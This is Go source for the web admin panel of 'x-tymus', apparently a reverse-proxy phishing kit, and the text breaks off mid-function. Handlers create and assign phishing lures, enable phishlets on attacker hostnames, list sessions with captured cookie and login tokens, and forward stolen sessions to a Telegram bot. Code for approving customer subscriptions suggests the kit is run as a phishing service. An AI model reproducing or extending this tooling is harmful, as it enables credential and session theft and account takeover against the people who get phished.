package core

import (
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/x-tymus/x-tymus/database"
	"github.com/x-tymus/x-tymus/log"
)

// ───────────────────────────── CSS / shell ─────────────────────────────────

const panelCSS = `
/* ─── DESIGN SYSTEM ─── */
:root {
  --bg-0: #0d1117;
  --bg-1: #161b22;
  --bg-2: #21262d;
  --bg-3: #30363d;
  --border: #30363d;
  --border-muted: #21262d;
  --text-primary: #e6edf3;
  --text-secondary: #8b949e;
  --text-muted: #6e7681;
  --accent: #58a6ff;
  --accent-brand: #7c3aed;
  --accent-success: #3fb950;
  --accent-warn: #d29922;
  --accent-danger: #f85149;
}

/* ─── RESET ─── */
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

html, body {
  height: 100%;
}

body {
  background: var(--bg-0);
  color: var(--text-primary);
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  font-size: 14px;
  line-height: 1.6;
  -webkit-font-smoothing: antialiased;
}

a {
  color: var(--accent);
  text-decoration: none;
}

a:hover {
  opacity: 0.8;
}

/* ─── SCROLLBAR ─── */
::-webkit-scrollbar {
  width: 8px;
  height: 8px;
}

::-webkit-scrollbar-track {
  background: var(--bg-1);
}

::-webkit-scrollbar-thumb {
  background: var(--border);
  border-radius: 4px;
}

::-webkit-scrollbar-thumb:hover {
  background: var(--border-muted);
}

/* ─── TOPBAR ─── */
.topbar {
  background: var(--bg-1);
  border-bottom: 1px solid var(--border);
  padding: 0 24px;
  height: 60px;
  display: flex;
  align-items: center;
  gap: 16px;
  position: sticky;
  top: 0;
  z-index: 100;
}

.brand {
  display: flex;
  align-items: center;
  gap: 10px;
  font-size: 16px;
  font-weight: 700;
  color: var(--text-primary);
  flex-shrink: 0;
}

.brand-icon {
  width: 32px;
  height: 32px;
  background: linear-gradient(135deg, var(--accent-brand), #a855f7);
  border-radius: 6px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 18px;
  color: white;
  box-shadow: 0 4px 12px rgba(124, 58, 237, 0.3);
}

.topbar-status {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-left: auto;
  font-size: 12px;
  color: var(--text-secondary);
}

.dot {
  width: 8px;
  height: 8px;
  background: var(--accent-success);
  border-radius: 50%;
  box-shadow: 0 0 8px var(--accent-success);
  animation: pulse 2s infinite;
}

@keyframes pulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.5; }
}

.topbar-nav {
  display: flex;
  gap: 4px;
}

.topbar-nav a {
  padding: 6px 12px;
  border-radius: 6px;
  font-size: 12px;
  font-weight: 500;
  transition: all 0.2s;
  color: var(--text-secondary);
}

.topbar-nav a:hover {
  background: var(--bg-2);
  color: var(--text-primary);
  opacity: 1;
}

/* ─── TABS ─── */
.tabbar {
  background: var(--bg-1);
  border-bottom: 1px solid var(--border);
  display: flex;
  padding: 0 24px;
  gap: 0;
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
}

.tabbar::-webkit-scrollbar {
  height: 4px;
}

.tab {
  padding: 14px 16px;
  font-size: 13px;
  font-weight: 500;
  color: var(--text-secondary);
  background: none;
  border: none;
  border-bottom: 2px solid transparent;
  cursor: pointer;
  white-space: nowrap;
  transition: all 0.2s;
  display: flex;
  align-items: center;
  gap: 8px;
}

.tab:hover {
  color: var(--text-primary);
  background: rgba(88, 166, 255, 0.05);
}

.tab.active {
  color: var(--accent);
  border-bottom-color: var(--accent);
}

.tab-pill {
  background: var(--accent-warn);
  color: #000;
  border-radius: 10px;
  padding: 2px 6px;
  font-size: 10px;
  font-weight: 700;
}

/* ─── LAYOUT ─── */
.wrap {
  max-width: 1400px;
  margin: 0 auto;
  padding: 32px 24px;
}

/* ─── STATS ─── */
.stats {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
  gap: 16px;
  margin-bottom: 32px;
}

.stat {
  background: var(--bg-1);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 20px;
  position: relative;
  overflow: hidden;
  transition: all 0.3s;
}

.stat:hover {
  border-color: var(--border-muted);
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
}

.stat::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 2px;
  background: linear-gradient(90deg, var(--accent), transparent);
  opacity: 0;
  transition: opacity 0.3s;
}

.stat:hover::before {
  opacity: 1;
}

.stat-l {
  font-size: 11px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  color: var(--text-muted);
  margin-bottom: 8px;
}

.stat-n {
  font-size: 28px;
  font-weight: 700;
  color: var(--text-primary);
}

/* ─── SECTIONS ─── */
.section {
  margin-bottom: 32px;
}

.section-hd {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 16px;
  padding-bottom: 12px;
  border-bottom: 1px solid var(--border);
}

.section-title {
  font-size: 13px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  color: var(--text-primary);
  margin: 0;
}

.section-line {
  flex: 1;
  height: 1px;
  background: var(--border);
}

/* ─── CARDS ─── */
.card {
  background: var(--bg-1);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 18px 20px;
  transition: all 0.3s;
}

.card:hover {
  border-color: var(--border-muted);
}

/* ─── FORMS ─── */
.form-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
  gap: 20px;
  margin-bottom: 20px;
}

.form-row {
  display: flex;
  gap: 12px;
  flex-wrap: wrap;
  align-items: flex-end;
}

.field {
  display: flex;
  flex-direction: column;
  gap: 6px;
}

.field-full {
  grid-column: 1 / -1;
}

.field-label {
  font-size: 12px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  color: var(--text-secondary);
}

input[type="text"],
input[type="password"],
input[type="email"],
select,
textarea {
  background: var(--bg-2);
  border: 1px solid var(--border);
  color: var(--text-primary);
  padding: 9px 12px;
  border-radius: 6px;
  font-size: 13px;
  font-family: inherit;
  transition: all 0.2s;
  width: 100%;
}

input[type="text"]:focus,
input[type="password"]:focus,
input[type="email"]:focus,
select:focus,
textarea:focus {
  outline: none;
  border-color: var(--accent);
  box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.1);
  background: var(--bg-2);
}

input::placeholder,
textarea::placeholder {
  color: var(--text-muted);
}

textarea {
  resize: vertical;
  min-height: 100px;
}

/* ─── BUTTONS ─── */
.btn,
button {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 9px 15px;
  border-radius: 6px;
  font-size: 13px;
  font-weight: 600;
  cursor: pointer;
  border: 1px solid transparent;
  text-decoration: none;
  white-space: nowrap;
  transition: all 0.2s;
  font-family: inherit;
  user-select: none;
}

.btn:hover,
button:hover {
  opacity: 0.9;
  transform: translateY(-1px);
}

.btn:active,
button:active {
  transform: translateY(0);
}

.btn-primary {
  background: var(--accent-brand);
  color: white;
  border-color: var(--accent-brand);
}

.btn-blue {
  background: var(--accent);
  color: white;
  border-color: var(--accent);
}

.btn-green {
  background: var(--accent-success);
  color: white;
  border-color: var(--accent-success);
}

.btn-danger {
  background: var(--accent-danger);
  color: white;
  border-color: var(--accent-danger);
}

.btn-ghost {
  background: transparent;
  color: var(--text-secondary);
  border-color: var(--border);
}

.btn-ghost:hover {
  background: var(--bg-2);
  color: var(--text-primary);
}

.btn-amber {
  background: rgba(210, 153, 34, 0.15);
  color: var(--accent-warn);
  border-color: rgba(210, 153, 34, 0.25);
}

.btn-sm {
  padding: 5px 11px;
  font-size: 12px;
}

.btn-xs {
  padding: 3px 8px;
  font-size: 11px;
}

/* ─── BADGES ─── */
.badge {
  display: inline-flex;
  align-items: center;
  padding: 4px 9px;
  border-radius: 16px;
  font-size: 11px;
  font-weight: 600;
  white-space: nowrap;
}

.badge-green {
  background: rgba(63, 185, 80, 0.15);
  color: var(--accent-success);
}

.badge-red {
  background: rgba(248, 81, 73, 0.15);
  color: var(--accent-danger);
}

.badge-blue {
  background: rgba(88, 166, 255, 0.15);
  color: var(--accent);
}

.badge-yellow,
.badge-amber {
  background: rgba(210, 153, 34, 0.15);
  color: var(--accent-warn);
}

.badge-gray {
  background: rgba(139, 148, 158, 0.15);
  color: var(--text-secondary);
}

.badge-purple {
  background: rgba(124, 58, 237, 0.15);
  color: var(--accent-brand);
}

/* ─── TABLES ─── */
.table-wrap {
  border: 1px solid var(--border);
  border-radius: 8px;
  overflow: hidden;
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
}

.table-wrap table {
  border: none !important;
  min-width: 100%;
}

table {
  width: 100%;
  border-collapse: collapse;
  font-size: 12.5px;
}

thead tr {
  background: var(--bg-2);
}

th {
  padding: 11px 14px;
  text-align: left;
  font-size: 11px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 0.4px;
  color: var(--text-secondary);
  border-bottom: 1px solid var(--border);
  white-space: nowrap;
}

td {
  padding: 11px 14px;
  border-bottom: 1px solid var(--border);
  vertical-align: middle;
}

tbody tr:last-child td {
  border-bottom: none;
}

tbody tr:hover {
  background: rgba(88, 166, 255, 0.03);
}

/* ─── ALERTS ─── */
.flash-err {
  background: rgba(248, 81, 73, 0.1);
  border: 1px solid rgba(248, 81, 73, 0.2);
  color: var(--accent-danger);
  border-radius: 6px;
  padding: 11px 14px;
  margin-bottom: 16px;
  font-size: 12px;
}

.flash-ok {
  background: rgba(63, 185, 80, 0.1);
  border: 1px solid rgba(63, 185, 80, 0.2);
  color: var(--accent-success);
  border-radius: 6px;
  padding: 11px 14px;
  margin-bottom: 16px;
  font-size: 12px;
}

/* ─── DETAILS ─── */
details {
  display: block;
  width: 100%;
}

details > summary {
  cursor: pointer;
  padding: 11px 12px;
  border-radius: 6px;
  background: var(--bg-2);
  border: 1px solid var(--border);
  color: var(--accent);
  font-weight: 600;
  user-select: none;
  list-style: none;
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 13px;
  transition: all 0.2s;
}

details > summary::-webkit-details-marker {
  display: none;
}

details > summary::before {
  content: '▶';
  font-size: 10px;
  transition: transform 0.2s;
}

details[open] > summary {
  background: rgba(88, 166, 255, 0.05);
  border-color: var(--accent);
}

details[open] > summary::before {
  transform: rotate(90deg);
}

details > form {
  display: block;
  width: 100%;
  margin-top: 8px;
}

/* ─── MISC ─── */
.mono {
  font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
  font-size: 11px;
  line-height: 1.5;
}

pre {
  background: var(--bg-2);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 11px 13px;
  font-size: 11px;
  overflow-x: auto;
  color: var(--text-secondary);
  white-space: pre-wrap;
  word-break: break-all;
}

.empty {
  color: var(--text-muted);
  padding: 40px 20px;
  text-align: center;
  font-size: 13px;
}

form.inline {
  display: inline;
}

.chain-box {
  background: rgba(63, 185, 80, 0.05);
  border: 1px solid rgba(63, 185, 80, 0.15);
  border-radius: 6px;
  padding: 12px;
  margin-top: 8px;
}

.chain-label {
  color: var(--accent-success);
  font-weight: 700;
  font-size: 10px;
  text-transform: uppercase;
  letter-spacing: 0.4px;
  margin: 8px 0 3px;
}

.chain-link {
  font-family: monospace;
  color: var(--accent-success);
  font-size: 11px;
  word-break: break-all;
}

.chain-hop {
  font-family: monospace;
  color: var(--text-muted);
  font-size: 10px;
  margin-top: 2px;
}

.url-cell {
  font-family: monospace;
  font-size: 11px;
  color: var(--accent);
  word-break: break-all;
}

.kv-row {
  display: flex;
  gap: 8px;
  align-items: center;
  margin-bottom: 6px;
  font-size: 12px;
}

.kv-key {
  color: var(--text-muted);
  font-weight: 600;
  text-transform: uppercase;
  font-size: 10px;
  letter-spacing: 0.4px;
  min-width: 90px;
}

.kv-val {
  color: var(--text-primary);
}

/* ─── RESPONSIVE ─── */
@media (max-width: 768px) {
  .topbar {
    padding: 0 16px;
    height: 56px;
  }

  .topbar-status {
    display: none;
  }

  .wrap {
    padding: 20px 16px;
  }

  .stats {
    grid-template-columns: repeat(2, 1fr);
    gap: 12px;
  }

  .form-grid {
    grid-template-columns: 1fr;
  }

  .tab {
    padding: 12px 14px;
    font-size: 12px;
  }

  th, td {
    padding: 9px 11px;
    font-size: 12px;
  }
}

@media (max-width: 480px) {
  .topbar {
    height: 48px;
    padding: 0 12px;
  }

  .brand {
    font-size: 14px;
  }

  .stats {
    grid-template-columns: 1fr;
  }

  .stat-n {
    font-size: 22px;
  }

  .wrap {
    padding: 16px 12px;
  }

  .tab-pill {
    display: none;
  }
}
`



func panelPage(title, navExtra, body string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>%s — x-tymus</title>
<style>%s</style>
</head>
<body>
<div class="topbar">
  <div class="brand">
    <div class="brand-icon">⚡</div>
    x-tymus
  </div>
  <div class="topbar-status">
    <span class="dot"></span>
    <span>online</span>
  </div>
  <nav class="topbar-nav">%s</nav>
</div>
<div class="wrap">%s</div>
<script>
function cp(el){
  var t=el.getAttribute('data-copy');
  var done=function(){var old=el.textContent;el.textContent='copied!';setTimeout(function(){el.textContent=old},1400);};
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(t).then(done,function(){fallbackCopy(t,done);});
  }else{fallbackCopy(t,done);}
}
function fallbackCopy(t,cb){
  var ta=document.createElement('textarea');
  ta.value=t;ta.style.cssText='position:fixed;left:-9999px;top:-9999px;opacity:0';
  document.body.appendChild(ta);ta.focus();ta.select();
  try{document.execCommand('copy');if(cb)cb();}catch(e){}
  document.body.removeChild(ta);
}
</script>
</body></html>`, title, panelCSS, navExtra, body)
}

// ───────────────────────────── Auth ────────────────────────────────────────

func (s *HttpServer) requireAdminAuth(w http.ResponseWriter, r *http.Request) bool {
	pass := s.Cfg.GetAdminPassword()
	if pass == "" {
		http.Error(w, "Admin password not set. Run: config admin_password <pass>", http.StatusForbidden)
		return false
	}
	user, pw, ok := r.BasicAuth()
	if !ok || user != "admin" || pw != pass {
		w.Header().Set("WWW-Authenticate", `Basic realm="x-tymus Admin"`)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return false
	}
	return true
}

// ───────────────────────────── Admin Panel ─────────────────────────────────

func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
	if !s.requireAdminAuth(w, r) {
		return
	}

	if r.Method == http.MethodPost {
		r.ParseForm()
		switch r.FormValue("action") {

		case "create_user":
			uname := strings.TrimSpace(r.FormValue("username"))
			pass := strings.TrimSpace(r.FormValue("password"))
			if uname == "" || pass == "" {
				http.Redirect(w, r, "/admin/panel?err=username+and+password+required", http.StatusSeeOther)
				return
			}
			token := GenRandomToken()
			if _, err := s.Db.CreateUser(uname, pass, token); err != nil {
				log.Error("admin: create user: %v", err)
				http.Redirect(w, r, "/admin/panel?err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
				return
			}
			log.Info("admin: created user '%s'", uname)
			http.Redirect(w, r, "/admin/panel?ok=user+created", http.StatusSeeOther)
			return

		case "delete_user":
			id, _ := strconv.Atoi(r.FormValue("id"))
			s.Db.DeleteUserById(id)
			http.Redirect(w, r, "/admin/panel", http.StatusSeeOther)
			return

		case "assign_lure":
			lureIdx, _ := strconv.Atoi(r.FormValue("lure_id"))
			username := strings.TrimSpace(r.FormValue("username"))
			l, err := s.Cfg.GetLure(lureIdx)
			if err == nil {
				if username == "" || username == "-" {
					l.UserId = ""
				} else {
					l.UserId = username
				}
				s.Cfg.SetLure(lureIdx, l)
			}
			http.Redirect(w, r, "/admin/panel?tab=lures", http.StatusSeeOther)
			return

		case "blacklist_add":
			ip := strings.TrimSpace(r.FormValue("ip"))
			if ip != "" && GlobalBlacklist != nil {
				GlobalBlacklist.AddIP(ip)
			}
			http.Redirect(w, r, "/admin/panel?tab=blacklist", http.StatusSeeOther)
			return

		case "blacklist_remove":
			ip := strings.TrimSpace(r.FormValue("ip"))
			if ip != "" && GlobalBlacklist != nil {
				GlobalBlacklist.RemoveIP(ip)
			}
			http.Redirect(w, r, "/admin/panel?tab=blacklist", http.StatusSeeOther)
			return

		case "delete_session":
			sid, _ := strconv.Atoi(r.FormValue("session_id"))
			s.Db.DeleteSessionById(sid)
			http.Redirect(w, r, "/admin/panel?tab=sessions", http.StatusSeeOther)
			return

		case "send_telegram":
			sid, _ := strconv.Atoi(r.FormValue("session_id"))
			if sess, err := s.Db.GetSessionById(sid); err == nil {
				NotifySessionFromDB(sess)
			}
			http.Redirect(w, r, "/admin/panel?tab=sessions&ok=sent+to+telegram", http.StatusSeeOther)
			return

		case "create_lure":
			pl := strings.TrimSpace(r.FormValue("phishlet"))
			path := strings.TrimSpace(r.FormValue("path"))
			redir := strings.TrimSpace(r.FormValue("redirect_url"))
			user := strings.TrimSpace(r.FormValue("user_id"))
			if pl == "" {
				http.Redirect(w, r, "/admin/panel?tab=lures&err=phishlet+required", http.StatusSeeOther)
				return
			}
			if path == "" {
				path = "/" + GenRandomString(8)
			}
			lure := &Lure{Path: path, Phishlet: pl, RedirectUrl: redir, UserId: user}
			s.Cfg.AddLure(pl, lure)
			http.Redirect(w, r, "/admin/panel?tab=lures&ok=lure+created", http.StatusSeeOther)
			return

		case "delete_lure":
			idx, _ := strconv.Atoi(r.FormValue("lure_id"))
			s.Cfg.DeleteLure(idx)
			http.Redirect(w, r, "/admin/panel?tab=lures", http.StatusSeeOther)
			return

		case "edit_lure":
			idx, _ := strconv.Atoi(r.FormValue("lure_id"))
			l, err := s.Cfg.GetLure(idx)
			if err == nil {
				if v := strings.TrimSpace(r.FormValue("redirect_url")); v != "" {
					l.RedirectUrl = v
				}
				if v := strings.TrimSpace(r.FormValue("redirector")); v != "" {
					l.Redirector = v
				}
				if v := strings.TrimSpace(r.FormValue("hostname")); v != "" {
					l.Hostname = v
				}
				if v := strings.TrimSpace(r.FormValue("path")); v != "" {
					l.Path = v
				}
				s.Cfg.SetLure(idx, l)
			}
			http.Redirect(w, r, "/admin/panel?tab=lures&ok=lure+updated", http.StatusSeeOther)
			return

		case "enable_phishlet":
			site := strings.TrimSpace(r.FormValue("site"))
			if err := s.Cfg.SetSiteEnabled(site); err != nil {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
			} else {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok="+url.QueryEscape(site+" enabled"), http.StatusSeeOther)
			}
			return

		case "disable_phishlet":
			site := strings.TrimSpace(r.FormValue("site"))
			if err := s.Cfg.SetSiteDisabled(site); err != nil {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
			} else {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok="+url.QueryEscape(site+" disabled"), http.StatusSeeOther)
			}
			return

		case "set_phishlet_hostname":
			site := strings.TrimSpace(r.FormValue("site"))
			hostname := strings.TrimSpace(r.FormValue("hostname"))
			if ok := s.Cfg.SetSiteHostname(site, hostname); !ok {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&err=failed+to+set+hostname", http.StatusSeeOther)
			} else {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok=hostname+saved", http.StatusSeeOther)
			}
			return

		case "set_phishlet_unauth":
			site := strings.TrimSpace(r.FormValue("site"))
			unauthUrl := strings.TrimSpace(r.FormValue("unauth_url"))
			if ok := s.Cfg.SetSiteUnauthUrl(site, unauthUrl); !ok {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&err=invalid+unauth+url", http.StatusSeeOther)
			} else {
				http.Redirect(w, r, "/admin/panel?tab=phishlets&ok=unauth+url+saved", http.StatusSeeOther)
			}
			return

		case "save_bot_config":
			token := strings.TrimSpace(r.FormValue("bot_token"))
			adminIdStr := strings.TrimSpace(r.FormValue("bot_admin_chat_id"))
			adminId, _ := strconv.ParseInt(adminIdStr, 10, 64)
			if token != "" {
				s.Cfg.SetBotToken(token)
			}
			if adminId != 0 {
				s.Cfg.SetBotAdminChatId(adminId)
			}
			http.Redirect(w, r, "/admin/panel?tab=telegram&ok=bot+config+saved+(restart+to+apply+token+change)", http.StatusSeeOther)
			return

		case "approve_sub":
			id, _ := strconv.Atoi(r.FormValue("sub_id"))
			if GlobalBot != nil {
				if err := GlobalBot.ApproveSub(id, s.Cfg.GetBotAdminChatId()); err != nil {
					http.Redirect(w, r, "/admin/panel?tab=telegram&err="+url.QueryEscape(err.Error()), http.StatusSeeOther)
					return
				}
			} else {
				http.Redirect(w, r, "/admin/panel?tab=telegram&err=bot+not+running", http.StatusSeeOther)
				return
			}
			http.Redirect(w, r, "/admin/panel?tab=telegram&ok=approved", http.StatusSeeOther)
			return

		case "reject_sub":
			id, _ := strconv.Atoi(r.FormValue("sub_id"))
			if GlobalBot != nil {
				GlobalBot.RejectSub(id, s.Cfg.GetBotAdminChatId())
			} else {
				s.Db.DeleteSubscription(id)
			}
			http.Redirect(w, r, "/admin/panel?tab=telegram", http.StatusSeeOther)
			return

		case "delete_sub":
			id, _ := strconv.Atoi(r.FormValue("sub_id"))
			s.Db.DeleteSubscription(id)
			http.Redirect(w, r, "/admin/panel?tab=telegram", http.StatusSeeOther)
			return
		}
	}

	// ── Gather data ──
	userList, _ := s.Db.ListUsers()
	allSessions, _ := s.Db.ListSessions()
	allLures := s.Cfg.GetAllLures()
	allSubs, _ := s.Db.ListSubscriptions()

	totalTokens := 0
	for _, sess := range allSessions {
		if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
			totalTokens++
		}
	}

	pendingSubs := 0
	for _, sub := range allSubs {
		if sub.Status == "pending" {
			pendingSubs++
		}
	}

	sessPerUser := map[string]int{}
	tokenPerUser := map[string]int{}
	for _, sess := range allSessions {
		for _, l := range allLures {
			if l.Phishlet == sess.Phishlet && l.UserId != "" {
				sessPerUser[l.UserId]++
				if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
					tokenPerUser[l.UserId]++
				}
				break
			}
		}
	}

	blCount := 0
	if GlobalBlacklist != nil {
		n, m := GlobalBlacklist.GetStats()
		blCount = n + m
	}

	activeTab := r.URL.Query().Get("tab")
	if activeTab == "" {
		activeTab = "overview"
	}
	errMsg := r.URL.Query().Get("err")
	okMsg := r.URL.Query().Get("ok")

	var b strings.Builder

	// ── Stats ──
	b.WriteString(fmt.Sprintf(`<div class="stats">
  <div class="stat"><div class="stat-n" style="color:var(--blue)">%d</div><div class="stat-l">Users</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--cyan)">%d</div><div class="stat-l">Lures</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--t1)">%d</div><div class="stat-l">Sessions</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--green)">%d</div><div class="stat-l">With Tokens</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--amber)">%d</div><div class="stat-l">Subscriptions</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--red)">%d</div><div class="stat-l">Pending Subs</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--t3)">%d</div><div class="stat-l">Blacklisted</div></div>
</div>`, len(userList), len(allLures), len(allSessions), totalTokens, len(allSubs), pendingSubs, blCount))

	if errMsg != "" {
		b.WriteString(fmt.Sprintf(`<div class="flash-err">%s</div>`, template.HTMLEscapeString(errMsg)))
	}
	if okMsg != "" {
		b.WriteString(fmt.Sprintf(`<div class="flash-ok">%s</div>`, template.HTMLEscapeString(okMsg)))
	}

	// ── Tabs ──
	pendingLabel := "Telegram Bot"
	if pendingSubs > 0 {
		pendingLabel = fmt.Sprintf(`Telegram Bot <span class="tab-pill">%d</span>`, pendingSubs)
	}
	tabs := []struct{ id, label string }{
		{"overview", "Overview"},
		{"users", "Users"},
		{"phishlets", "Phishlets"},
		{"lures", "Lures &amp; Chains"},
		{"sessions", "Sessions"},
		{"blacklist", "Blacklist"},
		{"telegram", pendingLabel},
	}
	b.WriteString(`<div class="tabbar">`)
	for _, t := range tabs {
		cls := "tab"
		if t.id == activeTab {
			cls += " active"
		}
		b.WriteString(fmt.Sprintf(`<a href="/admin/panel?tab=%s" class="%s">%s</a>`, t.id, cls, t.label))
	}
	b.WriteString(`</div><div style="height:20px"></div>`)

	// ── Tab content ──
	switch activeTab {

	// ── OVERVIEW ─────────────────────────────────────────────────────────────
	case "overview":
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Recent Sessions"))
		recent := allSessions
		if len(recent) > 10 {
			recent = recent[len(recent)-10:]
		}
		if len(recent) == 0 {
			b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
		} else {
			b.WriteString(sessionTable(recent, false))
		}
		b.WriteString(`</div>`)

		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Users"))
		b.WriteString(usersTable(userList, allLures, sessPerUser, tokenPerUser))
		b.WriteString(`</div>`)

	// ── USERS ─────────────────────────────────────────────────────────────────
	case "users":
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Create User"))
		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel">
<input type="hidden" name="action" value="create_user">
<div class="form-grid" style="grid-template-columns:repeat(auto-fill,minmax(180px,1fr))">
  <div class="field"><label class="field-label">Username</label><input type="text" name="username" placeholder="username" required></div>
  <div class="field"><label class="field-label">Password</label><input type="password" name="password" placeholder="password" required></div>
  <div class="field" style="justify-content:flex-end"><button type="submit" class="btn btn-blue">+ Create User</button></div>
</div>
</form></div></div>`)

		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("All Users"))
		b.WriteString(usersTable(userList, allLures, sessPerUser, tokenPerUser))
		b.WriteString(`</div>`)

	// ── PHISHLETS ─────────────────────────────────────────────────────────────
	case "phishlets":
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Phishlet Configuration"))
		names := s.Cfg.GetPhishletNames()
		if len(names) == 0 {
			b.WriteString(`<div class="empty">No phishlets loaded. Add .yaml files to your phishlets directory.</div>`)
		} else {
			b.WriteString(`<div class="table-wrap"><table><thead><tr>
<th>Name</th><th>Service</th><th>Hostname</th><th>Unauth URL</th><th>Status</th><th>Actions</th>
</tr></thead><tbody>`)
			for _, name := range names {
				pc := s.Cfg.PhishletConfig(name)
				enabled := pc.Enabled
				statusBadge := `<span class="badge badge-gray">disabled</span>`
				if enabled {
					statusBadge = `<span class="badge badge-green">● enabled</span>`
				}
				hostname := pc.Hostname
				if hostname == "" {
					hostname = `<span style="color:var(--t3)">not set</span>`
				}
				unauthUrl := pc.UnauthUrl
				if unauthUrl == "" {
					unauthUrl = `<span style="color:var(--t3)">—</span>`
				}

				toggleBtn := ""
				if enabled {
					toggleBtn = fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=phishlets">
<input type="hidden" name="action" value="disable_phishlet">
<input type="hidden" name="site" value="%s">
<button type="submit" class="btn btn-ghost btn-xs">Disable</button>
</form>`, template.HTMLEscapeString(name))
				} else {
					toggleBtn = fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=phishlets">
<input type="hidden" name="action" value="enable_phishlet">
<input type="hidden" name="site" value="%s">
<button type="submit" class="btn btn-green btn-xs">Enable</button>
</form>`, template.HTMLEscapeString(name))
				}

				hostnameForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=phishlets" style="display:flex;gap:5px;margin-top:5px">
<input type="hidden" name="action" value="set_phishlet_hostname">
<input type="hidden" name="site" value="%s">
<input type="text" name="hostname" placeholder="sub.domain.com" style="font-size:11.5px;padding:5px 8px" value="%s">
<button type="submit" class="btn btn-ghost btn-xs">Set</button>
</form>`, template.HTMLEscapeString(name), template.HTMLEscapeString(pc.Hostname))

				unauthForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=phishlets" style="display:flex;gap:5px;margin-top:5px">
<input type="hidden" name="action" value="set_phishlet_unauth">
<input type="hidden" name="site" value="%s">
<input type="text" name="unauth_url" placeholder="https://..." style="font-size:11.5px;padding:5px 8px" value="%s">
<button type="submit" class="btn btn-ghost btn-xs">Set</button>
</form>`, template.HTMLEscapeString(name), template.HTMLEscapeString(pc.UnauthUrl))

				b.WriteString(fmt.Sprintf(`<tr>
<td><span class="badge badge-purple">%s</span></td>
<td style="color:var(--t2);font-size:12px">%s</td>
<td>%s%s</td>
<td>%s%s</td>
<td>%s</td>
<td>%s</td>
</tr>`,
					template.HTMLEscapeString(name),
					phishletFriendlyName(name),
					hostname, hostnameForm,
					unauthUrl, unauthForm,
					statusBadge,
					toggleBtn,
				))
			}
			b.WriteString(`</tbody></table></div>`)
		}
		b.WriteString(`</div>`)

		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Quick Create Lure"))
		b.WriteString(createLureForm(s.Cfg.GetPhishletNames(), userList))
		b.WriteString(`</div>`)

	// ── LURES ─────────────────────────────────────────────────────────────────
	case "lures":
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Create Lure"))
		b.WriteString(createLureForm(s.Cfg.GetPhishletNames(), userList))
		b.WriteString(`</div>`)

		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("All Lures"))
		if len(allLures) == 0 {
			b.WriteString(`<div class="empty">No lures configured yet. Create one above.</div>`)
		} else {
			b.WriteString(`<div class="table-wrap"><table><thead><tr>
<th>#</th><th>Phishlet</th><th>Lure URL</th><th>Redirect URL</th><th>Assigned User</th><th>Redirect Chain</th><th>Actions</th>
</tr></thead><tbody>`)
			for i, l := range allLures {
				lureURL := ""
				if l.Hostname != "" {
					lureURL = "https://" + l.Hostname + l.Path
				} else if pl, err := s.Cfg.GetPhishlet(l.Phishlet); err == nil {
